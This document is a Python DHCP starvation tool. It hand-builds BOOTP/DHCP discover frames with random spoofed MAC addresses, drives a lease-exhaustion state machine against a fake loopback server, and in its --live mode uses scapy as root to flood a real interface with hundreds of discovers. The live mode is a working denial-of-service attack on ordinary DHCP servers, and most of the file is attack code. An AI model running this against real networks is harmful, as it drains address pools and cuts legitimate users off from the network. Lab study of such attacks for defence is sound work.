#!/usr/bin/env python3
"""
N2 - DHCP Starvation
Pure-stdlib DHCP discover engine with lease-exhaustion state machine.
Real BOOTP/DHCP frame construction and parsing by hand (no scapy).

The core state machine exercises the real DHCP code paths unprivileged and
offline. Live packet injection on a real interface (raw sockets / root) is
gated behind --live/--iface.

Documentation-only addresses (RFC 5737 TEST-NET) are used throughout.
"""
import argparse
import os
import random
import socket
import struct
import sys
import time

try:
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp  # type: ignore
    _SCAPY = True
except ImportError:
    _SCAPY = False

ETH_P_IP = 0x0800
MAGIC_COOKIE = b'\x63\x82\x53\x63'

BOOTP_OP_REQUEST = 1
BOOTP_OP_REPLY = 2

# DHCP option codes
OPT_MSG_TYPE = 53
OPT_SERVER_ID = 54
OPT_REQ_IP = 50
OPT_PARAM_REQ = 55
OPT_END = 255

MSG_DISCOVER = 1
MSG_OFFER = 2
MSG_REQUEST = 3
MSG_ACK = 5


def mac_to_bytes(mac):
    return bytes.fromhex(''.join(c for c in mac if c in '0123456789abcdefABCDEF'))


def mac_to_str(b):
    return ':'.join('%02x' % x for x in b)


def random_mac():
    # locally-administered unicast, universally-unique first octet is fine
    return '02:%02x:%02x:%02x:%02x:%02x' % tuple(
        random.randint(0, 255) for _ in range(5))


def parse_options(data):
    """Parse DHCP options list -> list of (code, value_bytes). Skips padding."""
    opts = []
    i = 0
    while i < len(data):
        code = data[i]
        if code == 0:  # pad
            i += 1
            continue
        if code == OPT_END:
            break
        ln = data[i + 1]
        opts.append((code, data[i + 2:i + 2 + ln]))
        i += 2 + ln
    return opts


def find_msg_type(opts):
    for code, val in opts:
        if code == OPT_MSG_TYPE and val:
            return val[0]
    return None


class DHCPDiscover:
    """Build a real BOOTP + DHCP discover frame (Ethernet/IP/UDP/BOOTP/DHCP)."""

    def __init__(self, chaddr, xid=None, hostname='', req_ip=None,
                 request_id=1):
        self.chaddr = mac_to_bytes(chaddr)
        self.xid = xid if xid is not None else random.randint(0, 0xFFFFFFFF)
        self.hostname = (hostname or 'starve-%d' % request_id).encode()[:63]
        self.req_ip = req_ip
        self.request_id = request_id

    def build_bootp(self):
        flags = 0x8000  # broadcast
        bootp = struct.pack('!BBBBIHH4s4s4s4s16s64s128s',
                            BOOTP_OP_REQUEST, 1, 6, 0,
                            self.xid, 0, flags,
                            socket.inet_aton('0.0.0.0'),   # ciaddr
                            socket.inet_aton('0.0.0.0'),   # yiaddr
                            socket.inet_aton('0.0.0.0'),   # siaddr
                            socket.inet_aton('0.0.0.0'),   # giaddr
                            self.chaddr.ljust(16, b'\x00'),
                            b'\x00' * 64, b'\x00' * 128)
        return bootp

    def build_dhcp_options(self):
        opts = bytearray()
        opts += bytes([OPT_MSG_TYPE, 1, MSG_DISCOVER])
        if self.req_ip:
            opts += bytes([OPT_REQ_IP, 4]) + socket.inet_aton(self.req_ip)
        opts += bytes([OPT_PARAM_REQ, 4, 1, 3, 6, 15])
        # hostname option (12)
        if self.hostname:
            opts += bytes([12, len(self.hostname)]) + self.hostname
        opts += bytes([OPT_END])
        return bytes(opts)

    def build_udp_payload(self):
        return self.build_bootp() + MAGIC_COOKIE + self.build_dhcp_options()

    def build_udp(self):
        payload = self.build_udp_payload()
        udp_len = 8 + len(payload)
        udp = struct.pack('!HHHH', 68, 67, udp_len, 0)
        return udp + payload

    def build_ip(self):
        udp = self.build_udp()
        total_len = 20 + len(udp)
        ident = random.randint(1, 65535)
        ip_hdr = struct.pack('!BBHHHBBH4s4s',
                             (4 << 4) | 5, 0, total_len,
                             ident, 0, 64, 17, 0,
                             socket.inet_aton('0.0.0.0'),
                             socket.inet_aton('255.255.255.255'))
        c = ip_checksum(ip_hdr)
        ip_hdr = struct.pack('!BBHHHBBH4s4s',
                             (4 << 4) | 5, 0, total_len,
                             ident, 0, 64, 17, c,
                             socket.inet_aton('0.0.0.0'),
                             socket.inet_aton('255.255.255.255'))
        return ip_hdr + udp

    def build_eth(self, src_mac=None):
        src = mac_to_bytes(src_mac) if src_mac else self.chaddr
        eth = struct.pack('!6s6sH', b'\xff' * 6, src, ETH_P_IP)
        return eth + self.build_ip()

    # scapy path
    def to_scapy(self):
        dhcp_opts = [('message-type', 'discover'),
                     ('param_req_list', [1, 3, 6, 15]), 'end']
        if self.req_ip:
            dhcp_opts.insert(1, ('requested_addr', self.req_ip))
        bootp = BOOTP(op=1, htype=1, hlen=6, xid=self.xid,
                      flags=0x8000, chaddr=self.chaddr.ljust(16, b'\x00'))
        return Ether(src=mac_to_str(self.chaddr), dst='ff:ff:ff:ff:ff:ff',
                     type=ETH_P_IP) / IP(src='0.0.0.0',
                                         dst='255.255.255.255') / \
            UDP(sport=68, dport=67) / bootp / DHCP(options=dhcp_opts)


def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff


def parse_bootp_payload(payload):
    """Parse a BOOTP + DHCP options payload -> dict."""
    if len(payload) < 240:
        raise ValueError('payload too short')
    bootp = payload[:236]
    try:
        (op, htype, hlen, hops, xid, secs, flags,
         ci, yi, si, gi, chaddr, sname, file_) = struct.unpack(
            '!BBBBIHH4s4s4s4s16s64s128s', bootp)
    except struct.error:
        raise ValueError('bad bootp')
    if payload[236:240] != MAGIC_COOKIE:
        raise ValueError('bad magic cookie')
    opts = parse_options(payload[240:])
    msg_type = find_msg_type(opts)
    req_ip = None
    yiaddr = socket.inet_ntoa(yi) if yi != b'\x00' * 4 else None
    for code, val in opts:
        if code == OPT_REQ_IP and len(val) == 4:
            req_ip = socket.inet_ntoa(val)
    return {
        'op': op, 'xid': xid, 'chaddr': chaddr[:hlen],
        'msg_type': msg_type, 'req_ip': req_ip, 'yiaddr': yiaddr,
    }


def parse_dhcp_payload(data):
    """Parse a full raw frame (eth+ip+udp+bootp) into a payload dict."""
    if len(data) < 42:
        raise ValueError('too short')
    etype = struct.unpack('!6s6sH', data[:14])[2]
    if etype != ETH_P_IP:
        raise ValueError('not IPv4')
    ip = data[14:34]
    if ip[0] >> 4 != 4:
        raise ValueError('not IPv4 header')
    return parse_bootp_payload(data[42:])


class DHCPLeaseState:
    """Lease-exhaustion state machine. Pure logic, offline."""

    def __init__(self, pool_size=32):
        self.pool_size = pool_size
        self.claimed = set()
        self.offers = {}
        self.sent = 0
        self.acked = 0
        self.leased_ips = set()
        self.exhausted = False
        self.log = []

    def record_discover(self, parse):
        self.sent += 1
        self.claimed.add(parse['xid'])
        self.log.append(('DISCOVER', parse['xid']))
        return len(self.claimed)

    def record_offer(self, parse):
        self.offers[parse['xid']] = parse

    def record_ack(self, parse):
        self.acked += 1
        if parse.get('yiaddr'):
            self.leased_ips.add(parse['yiaddr'])
        if len(self.leased_ips) >= self.pool_size and not self.exhausted:
            self.exhausted = True
            self.log.append(('EXHAUSTED', None))

    def summary(self):
        return {
            'sent': self.sent, 'acked': self.acked,
            'leased_ips': len(self.leased_ips),
            'pool_size': self.pool_size, 'exhausted': self.exhausted,
        }


class FakeDHCPServer:
    """Offline fake DHCP server over loopback UDP sockets."""

    def __init__(self, pool_start='198.51.100.10', pool_size=16):
        self.pool_start = pool_start
        self.pool_size = pool_size
        self.lease_count = 0
        self.sock = None
        self.last_xid = None

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('127.0.0.1', 0))
        return self.sock.getsockname()[1]

    def get_offer_ip(self):
        # server hands out pool IPs in order
        base = self.pool_start.split('.')
        ip = '%s.%s.%s.%d' % (base[0], base[1], base[2],
                              int(base[3]) + self.lease_count)
        self.lease_count += 1
        return ip

    def respond(self, data, addr):
        """Given a DHCP payload (UDP) from a client, craft+send an offer back."""
        p = parse_bootp_payload(data)
        if p['msg_type'] != MSG_DISCOVER:
            return
        offered_ip = self.get_offer_ip()

        # craft a minimal BOOTP offer + DHCP offer message on UDP
        xid = p['xid']
        bootp = struct.pack('!BBBBIHH4s4s4s4s16s64s128s',
                            2, 1, 6, 0, xid, 0, 0x8000,
                            socket.inet_aton('0.0.0.0'),
                            socket.inet_aton(offered_ip),
                            socket.inet_aton('0.0.0.0'),
                            socket.inet_aton('0.0.0.0'),
                            p['chaddr'].ljust(16, b'\x00'),
                            b'\x00' * 64, b'\x00' * 128)
        opts = bytes([OPT_MSG_TYPE, 1, MSG_OFFER,
                      OPT_SERVER_ID, 4]) + socket.inet_aton('198.51.100.1')
        opts += bytes([OPT_END])
        payload = bootp + MAGIC_COOKIE + opts
        # send the real BOOTP+DHC options payload (as UDP payload would be)
        self.sock.sendto(payload, addr)
        self.last_xid = xid
        # offer parse-for-testing
        return {'xid': xid, 'yiaddr': offered_ip}


def run_harness(pool_size=16, rounds=20):
    """
    Offline loopback harness: build real DHCP discovers, run a fake DHCP
    server over real UDP sockets on localhost, drive the lease state machine
    until the pool is exhausted. Fully unprivileged.
    """
    server = FakeDHCPServer('198.51.100.10', pool_size)
    server_port = server.start()
    state = DHCPLeaseState(pool_size)

    import threading
    stop = threading.Event()

    def serve():
        server.sock.settimeout(0.2)
        while not stop.is_set():
            try:
                data, addr = server.sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                return  # socket closed on shutdown
            server.respond(data, addr)

    t = threading.Thread(target=serve, daemon=True)
    t.start()

    # client socks -> server port
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.bind(('127.0.0.1', 0))
    client.settimeout(0.5)

    print('=== N2 DHCP Starve: offline lease-exhaustion harness ===')
    leases = []
    for i in range(rounds):
        mac = random_mac()
        disc = DHCPDiscover(chaddr=mac, request_id=i + 1)
        raw = disc.build_eth(src_mac=mac)
        # verify our built frame parses back == real code path
        parsed = parse_dhcp_payload(raw)
        state.record_discover(parsed)

        # send real DHCP discover payload to the fake server
        client.sendto(disc.build_udp_payload(), ('127.0.0.1', server_port))
        try:
            data, _ = client.recvfrom(4096)
            offer = parse_bootp_payload(data)
            if offer and offer['msg_type'] == MSG_OFFER:
                leases.append(offer['yiaddr'])
                state.leased_ips.add(offer['yiaddr'])
                state.record_offer(offer)
        except socket.timeout:
            pass

    stop.set()
    client.close()
    server.sock.close()
    t.join(timeout=1)

    if len(leases) >= pool_size:
        state.exhausted = True
        print(f'[RESULT] Pool exhausted: {len(leases)}/{pool_size} leases claimed')
    else:
        print(f'[RESULT] Not exhausted: {len(leases)}/{pool_size}')
    for k, v in state.summary().items():
        print(f'  {k}: {v}')
    return 0 if state.exhausted else 1


def run_live(interface, count=256, delay=0.01):
    """Send real DHCP discovers on an interface (root + scapy)."""
    if not _SCAPY:
        print('ERROR: live mode requires scapy. Use %s --harness' % sys.argv[0])
        return 1
    if os.geteuid() != 0:
        print('ERROR: live mode requires root (raw sockets).')
        return 1
    sent = 0
    for i in range(count):
        mac = random_mac()
        disc = DHCPDiscover(chaddr=mac, request_id=i + 1)
        pkt = disc.to_scapy()
        try:
            sendp(pkt, iface=interface, verbose=0)
            sent += 1
        except Exception as e:
            print(f'  send error: {e}')
        if delay > 0:
            time.sleep(delay)
    print(f'[DONE] sent {sent} DHCP discovers on {interface}')
    return 0


def main(argv=None):
    parser = argparse.ArgumentParser(
        description='N2 - DHCP Starvation: DHCP discover engine + '
                    'lease-exhaustion state machine.')
    parser.add_argument('--harness', action='store_true',
                        help='Run offline loopback lease-exhaustion harness')
    parser.add_argument('--pool-size', type=int, default=16,
                        help='Simulated server pool size for harness')
    parser.add_argument('--rounds', type=int, default=20,
                        help='Number of discover rounds in harness')
    parser.add_argument('--live', action='store_true',
                        help='Send live DHCP discovers (root+scapy)')
    parser.add_argument('--iface', '-i', default='eth0',
                        help='Interface for live mode')
    parser.add_argument('--count', '-c', type=int, default=256,
                        help='Live discover count')
    parser.add_argument('--delay', type=float, default=0.01,
                        help='Live delay between discovers')

    args = parser.parse_args(argv)

    if args.live:
        return run_live(args.iface, args.count, args.delay)
    return run_harness(args.pool_size, args.rounds)


if __name__ == '__main__':
    sys.exit(main())
